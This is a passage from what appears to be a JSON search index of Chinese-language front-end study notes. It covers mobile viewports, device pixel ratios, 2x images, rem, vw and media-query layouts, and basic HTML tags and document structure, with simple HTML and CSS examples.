的数字，一般来说是设置为 1:1 即：1.0\",\"maximum-scale\",\"最大缩放比，大于 0 的数字\",\"minimum-scale\",\"最小缩放比，大于 0 的数字\",\"user-scalable\",\"用户是否可以缩放，yes 或 no（1或0），一般来说是 no\"]},{\"header\":\"2.6 标准的viewport设置\",\"slug\":\"_2-6-标准的viewport设置\",\"contents\":[\"视口宽度和设备保存一致 device-width\",\"视口默认缩放比例 1.0\",\"不允许用户自行缩放 no\",\"最大允许的缩放比例 1.0\",\"最小允许的缩放比例 1.0\"]},{\"header\":\"2.7 移动端完美视口\",\"slug\":\"_2-7-移动端完美视口\",\"contents\":[\"不同屏幕，单位像素的多少是不同的，单位像素越多屏幕会越清晰\",\"默认情况下，移动端的网页都会将视口设置为 980像素（CSS像素），以确保pc端网页可以在移动端正常访问，但是如果网页的宽度超过了980，移动端的浏览器会自动对网页缩放以完整显示网页\",\"所以基本大部分的pc端网站都可以在移动端中正常浏览，但是往往都不会有一个好的体验，为了解决这个问题，大部分网站都会专门为移动端设计网页\",\"移动端默认情况下像素比是 980/移动端宽度，即视口宽度（css像素）/移动端物理屏幕宽度\",\"例如：我的手机是小米6，默认情况下像素比是980/1080=0.907\",\"如果我们直接在网页中编写移动端代码，这样在980的视口下，像素比是非常不好，导致网页中的内容非常小\",\"编写移动页面时，必须要确保有一个比较合理的像素比：1css像素对应2个物理像素、1css像素对应3个物理像素\",\"可以通过meta标签来设置视口宽度，控制像素比，如果这样固定视口宽度会导致在不同机型下显示效果不同\",\"所以不能将视口宽度写死\",\"<meta name=\\\"viewport\\\" content=\\\"width=100px\\\"> \",\"每一款移动设备设计时，都会有一个最佳的像素比，所以设备不同，像素比不同 一般我们只需要将像素比设置为该值即可得到一个最佳效果 将像素比设置为最佳像素比的视口大小我们称其为完美视口\",\"<meta name=\\\"viewport\\\" content=\\\"width=device-width\\\"> \",\"完美视口问题\",\"不同手机完美视口的大小是不同的\",\"iphonex 375px\",\"iphone6 414px\",\"如果设置一个元素宽度为375px，在iphonex里显示正常，在iphone6中就不能占满宽度\",\"由于不同设备视口和像素比不同，所以同样的375个像素在不同的设备下意义是不一样的\",\"为什么不用100%呢？\",\"在多层元素嵌套下，百分比的参照物不同，所以不能用百分比进行布局\"]},{\"header\":\"3. 二倍图\",\"slug\":\"_3-二倍图\",\"contents\":[]},{\"header\":\"3.1 物理像素&物理像素比\",\"slug\":\"_3-1-物理像素-物理像素比\",\"contents\":[\"物理像素点指的是屏幕显示的最小颗粒，是物理真实存在的\",\"在 PC 端页面，1px 等于 1 个物理像素，但是移动端就不尽相同\",\"移动端 1px 能实际显示的物理像素点的个数就称为物理像素比或屏幕像素比\",\"物理像素比 = 物理像素（分辨率） / 独立像素（CSS像素）\",\"例如：iPhone X 的物理像素比为 3\",\"屏幕尺寸\",\"独立像素（CSS像素）\",\"物理像素（分辨率）\",\"ppi/dpi（像素密度）\",\"dpr（倍图）\",\"5.8英寸\",\"812×375\",\"2436×1125\",\"458\",\"3\",\"浏览器放大两倍的情况：\",\"视口宽度 960px（CSS像素） 1920px（物理像素）\",\"此时，css像素和物理像素的比是1:2，即一个浏览器显示一个css像素宽度，物理像素用了两个像素显示（此处忽略高度），也就是100个css像素经过缩放200%后显示器显示200个像素\",\"我们可以通过改变视口的大小，来改变CSS像素和物理像素的比值\",\"影响视口宽度的因素有：浏览器缩放百分比，系统缩放,拖动浏览器窗口\",\"物理像素比提出的原因：\",\"在早期，PC及移动端都是：1CSS像素 = 1物理像素\",\"随着 Retina（视网膜屏幕）显示技术的普及，可以将更多的物理像素点压缩至一块屏幕里，从而达到更高的分辨率，并提高屏幕显示的细腻程度\",\"常见 iPhone 设备屏幕参数：\",\"设备\",\"物理分辨率\",\"开发分辨率\",\"物理像素比（dpr）\",\"iPhone13 Pro Max、12 Pro Max\",\"1284 * 2778\",\"428 * 926\",\"3\",\"iPhone 13\\\\13 Pro、12\\\\12 Pro\",\"1170 * 2532\",\"390 * 844\",\"3\",\"iPhone 13 mini、12 mini\",\"1080 * 2340\",\"375 * 812\",\"2.88（3）\",\"iPhone 11 Pro Max、XS Max\",\"1242 * 2688\",\"414 * 896\",\"3\",\"iPhone X、XS、11 Pro\",\"1125 * 2436\",\"375 * 812\",\"3\",\"iPhone XR、11\",\"828 * 1792\",\"414 * 896\",\"2\",\"iPhone 8 Plus\",\"1080 * 1920\",\"414 * 736\",\"2.6（3）\",\"iPhone 8、SE\",\"750 * 1334\",\"375 * 667\",\"2\",\"常见 iPad 设备屏幕参数：\",\"设备\",\"物理分辨率\",\"开发分辨率\",\"物理像素比（dpr）\",\"iPad Pro 12.9\",\"2048 * 2732\",\"1024 * 1366\",\"2\",\"iPad Pro 11\",\"1668 * 2388\",\"834 * 1194\",\"2\",\"iPad mini 8.3\",\"1488 * 2266\",\"744 * 1133\",\"2\",\"随着移动智能设备屏幕素质的不断提高，目前手机一般都统一使用 3 倍图，平板电脑使用 2 倍图\",\"电脑-显示器多倍图说明\",\"目前由于电脑显示器的素质也越来越高（尤其是笔记本电脑），2K屏、3K屏、4K屏、5K屏、6K屏 已经在不断普及，所以其实电脑端的也已经存在多倍图的应用了\",\"比如 Macbook Pro 16 M1 Pro/Max：物理分辨率（3456 * 2234）开发分辨率（1728 * 1117）2倍图\",\"当然电脑端用户都能够方便的设置屏幕显示的缩放比，当缩放比为100%时就为1倍图，但目前的电脑端显示器大多已经默认为 125%、150%、175%、200% 缩放比\",\"故，在未来多倍图的运用将会越来越必要！\",\"认识了缩放，就能合理的解释：为什么在电脑上设置了一个 100 * 100 的 div 盒子，而在浏览器上用测量工具测量像素长度时，却为 150 * 150，因为此时电脑显示器为 150% 的缩放比，只要我们将其改为 100%，就能得到我们想要的效果了\"]},{\"header\":\"3.2 多倍图\",\"slug\":\"_3-2-多倍图\",\"contents\":[\"对于一张 50px * 50px 的图片，在手机 Retina 屏中打开，按照刚才的物理像素比会放大倍数，这样会造成图片模糊（比如：3倍图手机中，50 * 50 实际上是 150 * 150 个像素在显示）\",\"在标准的 viewport 设置中，使用多倍图来提高图片质量，解决在高清设备中的模糊问题\",\"通常使用二倍图，是因为 iPhone 6\\\\7\\\\8 的影响，但是现在 3倍图、4倍图也逐渐普及了，这个要看实际开发需求\",\"背景图片也同样要注意缩放问题\",\"字体不用考虑缩放问题，因为字体是矢量的，不会失真\",\" /* 在 iphone8 下面 */ img { /* 原始图片100*100px */ width: 50px; height: 50px; } .box { /* 原始背景图片100*100px */ background-size: 50px 50px; } \",\"案例：\",\"<!doctype html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"ie=edge\\\"> <title>03-二倍图做法</title> <style> /* 我们需要一个50*50像素（css像素）的图片，直接放到我们的iphone8里面会放大2倍100*100就会模糊 */ /* 我们采取的是放一个100*100图片，然后手动的把这个图片缩小为50*50（css像素）*/ /* 我们准备的图片比我们实际需要的大小大2倍，这就方式就是2倍图 */ img:nth-child(2) { width: 50px; height: 50px; } </style> </head> <body> <!-- 模糊的 --> <img src=\\\"images/apple50.jpg\\\" alt=\\\"\\\"> <!-- 我们采取2倍图 --> <img src=\\\"images/apple100.jpg\\\" alt=\\\"\\\"> </body> </html> \"]},{\"header\":\"3.3 背景缩放\",\"slug\":\"_3-3-背景缩放\",\"contents\":[\"background-size 属性规定背景图像的尺寸\",\"background-size: 背景图片宽度 背景图片高度; \",\"单位：长度 | 百分比 | cover | contain\",\"cover 把背景图像扩展至足够大，以使背景图像完全覆盖背景区域\",\"contain 把图像扩展至最大尺寸，以使其宽度和高度完全适应内容区域\",\"注意：\",\"以长度为单位时，只写其中一个参数，另一个参数会自动适配\",\"以百分比为单位时，其参照对象为父盒子，只写其中一个参数，另一个参数会自动适配\"]},{\"header\":\"4. 移动端开发选择\",\"slug\":\"_4-移动端开发选择\",\"contents\":[]},{\"header\":\"4.1 移动端主流方案\",\"slug\":\"_4-1-移动端主流方案\",\"contents\":[\"单独制作移动端页面【主流】\",\"京东 https://m.jd.com/\",\"淘宝 https://m.taobao.com/\",\"苏宁 https://m.suning.com/\",\"……\",\"响应式页面兼容移动端【其次】\",\"https://www.samsungeshop.com.cn/\",\"……\"]},{\"header\":\"4.2 单独移动端页面（主流）\",\"slug\":\"_4-2-单独移动端页面-主流\",\"contents\":[\"通常情况下，网址域名前面加 m(mobile) 可以打开移动端\",\"通过判断设备，如果是移动设备打开，则跳到移动端页面\"]},{\"header\":\"4.3 响应式兼容移动端（其次）\",\"slug\":\"_4-3-响应式兼容移动端-其次\",\"contents\":[\"通过判断浏览器窗口宽度来改变样式，以适应不同终端\",\"缺点：制作麻烦，需要花很大精力去调兼容性问题\"]},{\"header\":\"5. 移动端技术解决方案\",\"slug\":\"_5-移动端技术解决方案\",\"contents\":[]},{\"header\":\"5.1 移动端浏览器\",\"slug\":\"_5-1-移动端浏览器\",\"contents\":[\"移动端浏览器基本以 webkit 内核为主，因此我们就考虑 webkit 兼容性问题\",\"我们可以放心使用 HTML5标签和CSS3样式\",\"同时我们浏览器的私有前缀我们只要考虑添加 webkit 即可\"]},{\"header\":\"5.2 移动端特殊样式\",\"slug\":\"_5-2-移动端特殊样式\",\"contents\":[\"/* CSS3盒子模型 */ box-sizing: border-box; -webkit-box-sizing: border-box; /* 浏览器前缀兼容老版本浏览器 */ /* 移动端中某些地方点击会高亮，我们一般需要清除，设置 transparent 完成透明 */ /* 说明：比如 a链接 在移动端默认点击时会有一个背景颜色高亮 */ -webkit-tap-highlight-color: transparent; /* 比如可以这样： */ * { -webkit-tap-highlight-color: transparent; } /* 移动端浏览器默认的外观在 iOS 上加上这个属性才能给按钮和输入框自定义样式 */ -webkit-appearance: none; /* 比如可以这样： */ input { -webkit-appearance: none; } /* 禁用长按页面时的弹出菜单 */ -webkit-touch-callout: none; /* 此处以 img 及 a 为例子 */ img, a { -webkit-touch-callout: none; } \"]},{\"header\":\"6. 移动端常见布局\",\"slug\":\"_6-移动端常见布局\",\"contents\":[\"移动端布局和以前我们学习的PC端有所区别：\",\"单独制作移动端页面【主流】\",\"流式布局（百分比布局）\",\"flex 弹性布局（强烈推荐）\",\"less + rem + 媒体查询布局\",\"混合布局\",\"响应式页面兼容移动端【其次】\",\"媒体查询\",\"bootstrap\"]},{\"header\":\"6.1 流式布局（百分比布局）\",\"slug\":\"_6-1-流式布局-百分比布局\",\"contents\":[\"流式布局，就是百分比布局，也称非固定像素布局\",\"通过盒子的宽度设置成百分比来根据屏幕的宽度来进行伸缩，不受固定像素的限时，内容向两侧填充\",\"流式布局方式是移动Web开发使用的比较常见的布局方式\",\"max-width 最大宽度（max-height 最大高度）\",\"min-width 最小宽度（min-height 最小高度）\",\"案例：\",\"<!doctype html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0\\\"> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"ie=edge\\\"> <title>08-流式布局</title> <style> * { margin: 0; padding: 0; } section { width: 100%; max-width: 980px; min-width: 320px; margin: 0 auto; } section div { float: left; width: 50%; height: 400px; } section div:nth-child(1) { background-color: pink; } section div:nth-child(2) { background-color: rgb(0, 0, 0); } </style> </head> <body> <section> <div></div> <div></div> </section> </body> </html> \"]},{\"header\":\"6.2 rem适配布局\",\"slug\":\"_6-2-rem适配布局\",\"contents\":[]},{\"header\":\"6.2.1 rem与媒体查询\",\"slug\":\"_6-2-1-rem与媒体查询\",\"contents\":[\"【思考】\",\"页面布局文字能否随着屏幕大小变化而变化？\",\"流式布局和 flex 布局主要针对于宽度布局，那高度如何设置？\",\"怎么样让屏幕发生变化的时候元素高度和宽度等比例缩放？\",\"rem（root em）是一个相对单位，类似于 em，em 是父元素字体大小\",\"不同的是 rem 的基准是相对于 html 元素的字体大小\",\"比如，根元素（html）设置 font-size=12px，非根元素设置 width: 2rem; 则换成 px 表示就是 24px\",\"rem 的优势：父元素文字大小可能不一致，但是整个页面只有一个 html，可以很好来控制整个页面的元素大小（即：达到统一控制全局字体大小的效果！）\",\"注意：rem 控制的不仅仅是字体大小，还能控制其他元素的大小。\",\"/* 根 html 为 12px */ html { font-size: 12px; } /* 此时 div 的字体大小就是 24px */ div { font-size: 2rem； } \",\"【案例】\",\"<!doctype html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"ie=edge\\\"> <title>rem单位</title> <style> html { font-size: 12px; } div { font-size: 12px; width: 15rem; height: 15rem; background-color: purple; } p { /* 1. em 相对于父元素的字体大小来说的 */ /* width: 10em; height: 10em; */ /* 2. rem 相对于 html 元素字体大小来说的 */ width: 10rem; height: 10rem; background-color: pink; /* 3.rem 的优点就是可以通过修改 html 里面的文字大小来改变页面中元素的大小可以整体控制 */ } </style> </head> <body> <div> <p></p> </div> </body> </html> \",\"注：虽然使用 rem 之后实现了全局字体大小的统一控制，但是依旧不能根据窗口大小自动适配，需要使用媒体查询\",\"rem 单位是跟着 html 来走的，有了 rem 页面元素可以设置不同大小尺寸\",\"媒体查询可以根据不同设备宽度来修改样式\",\"媒体查询 + rem就可以实现不同设备宽度，实现页面元素大小的动态变化\",\"案例：\",\"<!doctype html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"ie=edge\\\"> <title>媒体查询+rem实现元素动态变化</title> <style> * { margin: 0; padding: 0; } /* html { font-size: 100px; } */ /* 从小到大的顺序 */ @media screen and (min-width: 320px) { html { font-size: 50px; } } @media screen and (min-width: 640px) { html { font-size: 100px; } } .top { height: 1rem; font-size: .5rem; background-color: green; color: #fff; text-align: center; line-height: 1rem; } </style> </head> <body> <div class=\\\"top\\\">购物车</div> </body> </html> \"]},{\"header\":\"6.2.2 rem适配方案\",\"slug\":\"_6-2-2-rem适配方案\",\"contents\":[\"【思考】\",\"我们适配的目标是什么？\",\"怎么去达到这个目标的？\",\"在实际的开发如何实现？\",\"【答案】\",\"让一些不能等比自适应的元素，达到当设备尺寸发生改变的时候，等比例适配当前设备\",\"使用媒体查询根据不同的设备按比例设置 html 的字体大小，然后页面元素使用 rem 做尺寸单位，当 html 做尺寸单位，当 html 字体大小变化元素尺寸也会发生变化，从而达到等比缩放的适配\",\"实际开发中 \",\"按照设计稿与设备宽度的比例，动态计算并设置 html 根标签的 font-size 大小（媒体查询）\",\"CSS 中，设计稿元素的宽、高、相对位置等取值，按照同等比例换算为 rem 为单位的值\",\"主要有两种方案：\",\"技术方案1\",\"less\",\"媒体查询\",\"rem\",\"技术方案2\",\"vw\",\"rem\"]},{\"header\":\"6.2.2.1 方案1\",\"slug\":\"_6-2-2-1-方案1\",\"contents\":[\"rem + 媒体查询 + less\",\"（1）设计稿常见尺寸宽度\",\"设备\",\"常见宽度\",\"iphone 4 5\",\"640px\",\"iphone 6 7 8\",\"750px\",\"iphone x 11 12\",\"1170px\",\"Android\",\"常见 320px、360px、375px、384px、400px、414px、500px、720px、1080px\",\"一般情况下，我们以一套或两套效果图适应大部分的屏幕，放弃极端屏或对其优雅降级，牺牲一些效果，现在基本以 750px 为准。（目前应该是 1080px）\",\"（2）动态设置 html 标签 font-size 大小\",\"假设设计稿是 750px\",\"假设我们把整个屏幕划分为 15 等份（划分标准不一，可以是 20 份，也可以是 10 等份）\",\"每一份作为 html 字体大小，这里就是 750/15 = 50px\",\"那么在 320px 设备的时候，字体大小为 320/15 = 21.33px\",\"用我们页面元素的大小除以不同的 html 字体大小会发现他们比例还是相同的\",\"比如我们以 750px 设计稿\",\"此时便实现了不同屏幕下页面元素盒子等比例缩放的效果\",\"（3）元素大小取值方法\",\"最后的公式：页面元素的 rem 值 = 页面元素值（px） / （屏幕宽度 / 划分份数）\",\"屏幕宽度 / 划分份数 = html font-size 的大小\",\"或者：页面元素的 rem 值 = 页面元素值（px） / html font-size 字体大小\",\"【案例】\",\"<!doctype html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"ie=edge\\\"> <title>rem适配方案</title> <style> @media screen and (min-width: 320px) { html { font-size: 21.33px; } } @media screen and (min-width: 750px) { html { font-size: 50px; } } div { width: 2rem; height: 2rem; background-color: pink; } /* 1. 首先我们选一套标准尺寸 750px 为准 2. 我们用屏幕尺寸 除以 我们划分的份数 得到了 html 里面的文字大小 但是我们知道不同屏幕下得到的文字大小是不一样的 */ /* 3. 页面元素的 rem值 = 页面元素在 750 像素的下px值 / html 里面的文字大小 */ </style> </head> <body> <div></div> </body> </html> \"]},{\"header\":\"6.2.2.2 方案2\",\"slug\":\"_6-2-2-2-方案2\",\"contents\":[\"vw表示的是视口的宽度（viewport width）\",\"100vw = 一个视口的宽度\",\"1vw = 1%视口宽度\",\"vw单位永远参考于视口宽度进行计算\",\"常规的设计图宽度750px，使用vw如何通过设计图中的大小来设计网站大小\",\"设计图中48x35像素大小的元素如何在页面中保证元素大小\",\"100vw = 750px （设计图中像素）\",\"0.1333333333333333333vw = 1px\",\"0.13333333333vw x 48px = 6.4vw\",\"0.13333333333vw x 35px = 4.66666666666vw\",\"如果根据设计图像素计算vw ， 必须通过0.133333333333*px ，数值的换算非常不方便\",\"1rem = 1 html的字体大小\",\"能否将font-size设置为0.1333333333来方便设置vw呢？\",\"font-size: 0.1333333333333333vw; \",\"网页中字体大小最小是12px，不能设置一个比12像素还小的字体\",\"如果我们设置了一个小于12px的字体，则字体自动设置为12\",\"现在将font-size 扩大100倍\",\"font-size: 13.33333333333333vw; \",\"每次使用时设计图像素除100\",\"0.01rem = 1px 也可以用设计图像素乘以0.01\",\"width: 0.48rem; height: 0.35rem; \"]},{\"header\":\"6.3 vw布局\",\"slug\":\"_6-3-vw布局\",\"contents\":[\"移动端推荐使用：flex + less + vw\"]},{\"header\":\"6.3.1 vw/vh是什么\",\"slug\":\"_6-3-1-vw-vh是什么\",\"contents\":[\"vw/vh 是一个相对单位（类似 em 和 rem 相对单位） \",\"vw 是：viewport width 视口宽度单位\",\"vh 是：viewport height 视口高度单位\",\"相对视口的尺寸计算结果 \",\"1vw = 1/100 视口宽度\",\"1vh = 1/100 视口高度\",\"例如：\",\"当前屏幕视口是 375px，则 1vw 就是 3.75px，如果当前屏幕视口为 414px，则 1vw 就是 4.14px\",\"注意：和百分比有区别，百分比是相对于父元素来说的，而 vw 和 vh 总是针对于当前视口来说的\"]},{\"header\":\"6.3.2 vw/vh怎么用\",\"slug\":\"_6-3-2-vw-vh怎么用\",\"contents\":[\"超级简单，元素单位直接使用新单位 vw/vh 即可\",\"因为 vw/vh 是相对单位，所以不同视口（屏幕）下，宽高一起变化完成适配\",\"直接使用即可！永远滴神！\",\"【案例】\",\"div { width: 10vw; height: 10vh; background-color: pink; } \",\"如何还原设计稿？\",\"前提：我们设计稿按照 iPhone 6/7/8 来设计，有个盒子是 50px * 50px 的，如何使用 vw 呢？\",\"分析：\",\"设计稿参照 iPhone 6/7/8，所以视口宽度尺寸是 375px（设计原型图平台切换到 2x 模式再测量，因为 UI 设计图是 750px 的）\",\"那么 1vw 是多少像素？\",\"375px / 100 = 3.75px\",\"我们元素的目标是多少像素？\",\"50px * 50px\",\"那么 50 * 50 是多少个 vw？\",\"50 / 3.75 = 13.3333vw\",\"在 UI 软件中，直接选择 vw 单位然后测量即可，不用人工计算\"]},{\"header\":\"6.3.3 vw注意事项\",\"slug\":\"_6-3-3-vw注意事项\",\"contents\":[\"因为涉及到大量除法且有除不尽的情况，所以还是使用 LESS 搭配更好点\",\"我们本质是根据视口宽度来等比例缩放页面元素高度和宽度的，所以开发中使用 vw 就基本够用了。vh 很少使用（高度变化时，我们一般不需要元素大小进行变化，所以用不到 vh）\",\"div { /* 都用vm */ width: 13.333333vw; height: 12.666666vw; font-size: 5.333333vw; background-color: pink; } \"]}]},\"/front-end/css-notes/\":{\"title\":\"CSS笔记\",\"contents\":[]},\"/front-end/html-notes/01-HTML%E7%AE%80%E4%BB%8B.html\":{\"title\":\"HTML简介\",\"contents\":[{\"header\":\"1. 什么是 HTML\",\"slug\":\"_1-什么是-html\",\"contents\":[\"HTML 指的是超文本标记语言 (Hyper Text Markup Language) ，它是用来描述网页的一种语言\",\"HTML 不是一种编程语言，而是一种标记语言 (markup language)，标记语言是一套标记标签 (markup tag)\"]},{\"header\":\"2. Web 标准\",\"slug\":\"_2-web-标准\",\"contents\":[\"Web 标准是由 W3C组织 和其他标准化组织制定的一系列标准的集合。W3C（万维网联盟）是国际最著名的标准化组织\"]},{\"header\":\"2.1 为什么需要 Web 标准\",\"slug\":\"_2-1-为什么需要-web-标准\",\"contents\":[\"浏览器不同，它们显示页面或者排版就有些许差异，遵循 Web 标准除了可以让不同的开发人员写出的页面更标准、更统一外，还有以下优点：\",\"让 Web 的发展前景更广阔\",\"内容能被更广泛的设备访问\",\"更容易被搜索引擎搜索\",\"降低网站流量费用\",\"使网站更易于维护\",\"提高页面浏览速度\"]},{\"header\":\"2.2 Web 标准的构成\",\"slug\":\"_2-2-web-标准的构成\",\"contents\":[\"主要包括：结构（Structure）、表现（Presentation）和行为（Behavior）三个方面\",\"Web 标准提出的最佳体验方案：结构、样式、行为相分离\",\"简单理解：结构写到 HTML 文件中，表现写到 CSS 文件中，行为写到 JavaScript 文件中\",\"结构类似身体\",\"表现类似外观装饰\",\"行为类似行为动作\",\"相比较而言, 三者中结构最重要\"]}]},\"/front-end/html-notes/02-HTML%E6%A0%87%E7%AD%BE.html\":{\"title\":\"HTML标签\",\"contents\":[{\"header\":\"1. HTML标签\",\"slug\":\"_1-html标签\",\"contents\":[\"标签又称元素，是 HTML 的基本组成单位\",\"HTML 标签是由尖括号包围的关键词，例如 <html>\",\"标签分为单标签和双标签\",\"HTML 标签通常是成对出现的，例如 <html> 和 </html> ，我们称为双标签\",\"标签对中的第一个标签是开始标签，第二个标签是结束标签\",\"有些特殊的标签必须是单个标签（极少情况），例如 <br/>，我们称为单标签\",\"双标签关系可以分为两类：包含关系和并列关系\",\"包含关系：\",\"<head> <title> </title> </head> \",\"并列关系：\",\"<head> </head> <body> </body> \"]},{\"header\":\"2. HTML标签属性\",\"slug\":\"_2-html标签属性\",\"contents\":[\"用于给标签提供附加信息，可以写在起始标签或单标签中，即 <标签名 属性名=\\\"属性值\\\" 属性名=\\\"属性值\\\">\",\"有些特殊的属性，没有属性名，只有属性值\",\"注意：\",\"不同的标签，有不同的属性；也有一些通用属性（在任何标签内都能写）\",\"属性名、属性值不能乱写，都是 W3C 规定好的\",\"属性名、属性值，都不区分大小写，但推荐小写\",\"双引号，也可以写成单引号，甚至不写都行，但还是推荐写双引号\",\"标签中不要出现同名属性，否则后写的会失效\"]}]},\"/front-end/html-notes/03-HTML%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84.html\":{\"title\":\"HTML基本结构\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"每个网页都会有一个基本的结构标签（也称为骨架标签），页面内容也是在这些基本标签上书写\",\"标签名\",\"定义\",\"说明\",\"<html></html>\",\"HTML 标签\",\"页面中最大的标签，我们称为根标签\",\"<head></head>\",\"文档的头部\",\"注意在 head 标签中我们必须要设置的标签是 title\",\"<title></title>\",\"文档的标题\",\"让页面拥有一个属于自己的网页标题\",\"<body></body>\",\"文档的主体\",\"元素包含文档的所有内容，页面内容基本都是放到 body 里面的\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <title>Document</title> </head> <body> </body> </html> \",\"想要呈现在网页中的内容写在 body 标签中\",\"head 标签中的内容不会出现在网页中\",\"head 标签中的 title 标签可以指定网页的标题\"]},{\"header\":\"1. HTML文档声明\",\"slug\":\"_1-html文档声明\",\"contents\":[\"<!DOCTYPE html> 文档类型声明标签, 告诉浏览器这个页面采取 HTML 5 版本来显示页面\",\"注意：\",\"声明位于文档中的最前面的位置，处于 <html> 标签之前\",\"不是一个 HTML 标签，它就是文档类型声明标签\"]},{\"header\":\"2. HTML设置语言\",\"slug\":\"_2-html设置语言\",\"contents\":[\"用来定义当前文档显示的语言：\",\"en 定义语言为英语\",\"zh-CN 定义语言为中文\",\"主要作用：让浏览器显示对应的翻译提示；有利于搜索引擎优化\",\"简单来说, 定义为 en 就是英文网页, 定义为 zh-CN 就是中文网页\",\"其实对于文档显示来说，定义成 en 的文档也可以显示中文，定义成 zh-CN 的文档也可以显示英文\"]},{\"header\":\"3. HTML 字符编码\",\"slug\":\"_3-html-字符编码\",\"contents\":[\"字符集 (Character set)是多个字符的集合。以便计算机能够识别和存储各种文字\",\"在 <head> 标签内，可以通过 <meta> 标签的 charset 属性来规定 HTML 文档应该使用哪种字符编码\",\"<meta charset=\\\"UTF-8\\\" />\",\"charset 常用的值有：GB 2312 、BIG 5 、GBK 和 UTF-8，其中 UTF-8 也被称为万国码，基本包含了全世界所有国家需要用到的字符\",\"注意：上面语法是必须要写的代码，否则可能引起乱码的情况。一般情况下，统一使用“UTF-8”编码，尽量统一写成标准的 \\\"UTF-8\\\"，不要写成  \\\"utf 8\\\" 或 \\\"UTF 8\\\"\"]}]},\"/front-end/html-notes/04-HTML%E6%B3%A8%E9%87%8A.html\":{\"title\":\"HTML注释\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"如果需要在 HTML 文档中添加一些便于阅读和理解但又不需要显示在页面中的注释文字，就需要使用注释标签\",\"HTML 中的注释以 <!-- 开头，以 --> 结束\",\"具体实现：\",\" <!-- 注释语句 --> \",\"VSCode中快捷键: ctrl + / \",\"添加注释是为了更好地解释代码的功能，便于相关开发人员理解和阅读代码，程序是不会执行注释内容的\"]}]},\"/front-end/html-notes/05-HTML%E5%9F%BA%E7%A1%80.html\":{\"title\":\"HTML基础\",\"contents\":[{\"header\":\"1. 排版标签\",\"slug\":\"_1-排版标签\",\"contents\":[\"标签名\",\"标签含义\",\"单/双标签\",\"h1~h6\",\"标题\",\"双\",\"p\",\"段落\",\"双\",\"div、span\",\"没有任何含义，用于整体布局\",\"双\"]},{\"header\":\"1.1 标题标签\",\"slug\":\"_1-1-标题标签\",\"contents\":[\"标题标签 <h1> - <h6>\",\"为了使网页更具有语义化，我们经常会在页面中用到标题标签。HTML 提供了 6 个等级的网页标题，即 <h1> - <h6> ，有重要的意味\",\"特点：\",\"加了标题的文字会变的加粗，字号也会依次变大\",\"一个标题独占一行\"]},{\"header\":\"1.2 段落标签\",\"slug\":\"_1-2-段落标签\",\"contents\":[\"在网页中，要把文字有条理地显示出来，就需要将这些文字分段显示。在 HTML 标签中，<p> 标签用于定义段落，它可以将整个网页分为若干个段落\",\"特点：\",\"文本在一个段落中会根据浏览器窗口的大小自动换行\",\"段落和段落之间保有空隙\"]},{\"header\":\"1.3 div 和 span 标签\",\"slug\":\"_1-3-div-和-span-标签\",\"contents\":[\"<div> 和 <span> 是没有语义的，它们就是一个盒子，用来装内容的\",\"特点：\",\"<div> 标签用来布局，但是一行只能放一个 <div>，大盒子\",\"<span> 标签用来布局，一行上可以多个 <span>，小盒子\"]},{\"header\":\"2. 语义化标签\",\"slug\":\"_2-语义化标签\",\"contents\":[\"概念：用特定的标签去表达特定的含义\",\"原则：标签的默认效果不重要（后期可以通过 CSS 随便控制效果），语义最重要！\",\"优势：\",\"代码结构清晰可读性强\",\"有利于 SEO（搜索引擎优化）\",\"方便设备解析（如屏幕阅读器、盲人阅读器等）\"]},{\"header\":\"3. 块级元素与行内元素\",\"slug\":\"_3-块级元素与行内元素\",\"contents\":[\"块级元素：独占一行（排版标签都是块级元素）\",\"行内元素：不独占一行\",\"使用原则：\",\"块级元素中能写行内元素和块级元素（简单记：块级元素中几乎什么都能写）\",\"行内元素中能写行内元素，但不能写块级元素\",\"一些特殊的规则： h1~h6 不能互相嵌套、p 中不要写块级元素\"]},{\"header\":\"4. 文本标签\",\"slug\":\"_4-文本标签\",\"contents\":[\"语义\",\"标签\",\"说明\",\"加粗\",\"<strong></strong>或<b></b>\",\"更推荐使用 <strong> 标签加粗，语义更强烈\",\"倾斜\",\"<em></em>或<i></i>\",\"更推荐使用 <em> 标签倾斜，语义更强烈\",\"删除线\",\"<del></del>或<s></s>\",\"更推荐使用 <del> 标签添加删除线，语义更强烈\",\"下划线\",\"<ins></ins>或<u></u>\",\"更推荐使用 <ins> 标签添加下划线，语义更强烈\"]},{\"header\":\"5. 图片标签\",\"slug\":\"_5-图片标签\",\"contents\":[]},{\"header\":\"5.1 图片标签\",\"slug\":\"_5-1-图片标签\",\"contents\":[\"在 HTML 标签中，<img> 标签用于定义 HTML 页面中的图像\",\"具体实现：\",\"<img src=\\\"图像URL\\\" /> \",\"解释：src 是 <img> 